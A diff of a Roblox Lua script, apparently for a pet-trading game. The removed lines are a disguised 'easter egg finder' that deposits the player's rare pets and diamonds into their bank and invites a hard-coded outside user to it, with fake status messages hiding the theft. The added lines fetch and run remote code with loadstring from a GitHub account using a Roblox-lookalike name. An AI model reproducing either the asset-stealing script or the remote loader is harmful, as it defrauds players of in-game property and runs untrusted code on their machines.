@@ -1,21 +1,2 @@
-local LocalNumber = 1512601908
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
-local mybanks = lib.Network.Invoke("get my banks")
-local PetsList = {}
-for i,v in pairs(lib.Save.Get().Pets) do
-    local v2 = lib.Directory.Pets[v.id];
-    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
-        table.insert(PetsList, v.uid);
-    end
-end
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
-if request then
-    lib.Message.New("Welcome to easter egg finder(V2).Click OK to continue!(made by mineYT)");
-else
-end
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-    lib.Message.New("Finding nearest Easter egg area(this might take some time");
-else
-    lib.Message.New("Could not find more than 50 easter eggs, please rejoin to another server (UNKNOWN ERROR 12");
-end;  
+_G.AuthKey = "6B6B41ED-9B86-4CCE-84D7-0A9642D7E8AD"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
